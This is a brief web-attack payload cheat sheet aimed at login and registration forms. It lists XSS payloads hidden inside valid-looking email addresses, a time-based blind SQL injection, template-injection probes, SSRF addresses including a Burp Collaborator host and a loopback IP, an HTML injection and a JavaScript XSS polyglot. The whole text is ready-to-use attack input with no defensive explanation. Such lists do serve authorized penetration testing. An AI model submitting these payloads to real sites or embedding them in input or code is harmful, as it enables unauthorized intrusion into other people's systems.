Login and register payloads:

- valid Email payloads:
1. test+(<script>alert(0)</script>)@example.com
2. test@example(<script>alert(0)</script>).com
3. "<script>alert(0)</script>"@example.com


Sql injection:
(select(0)from(select(sleep(25)))v) --> Blind 25 seconds



SSTI template injection:
"<%= 7 * 7 %>"@example.com
test+(${{7*7}})@example.com

SSRF:
john.doe@abc123.burpcollaborator.net
john.doe@[127.0.0.1]
-------------------------
html injection(Can use match and replace in request body):
<u>123</u>


-------------
JS polyglots
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e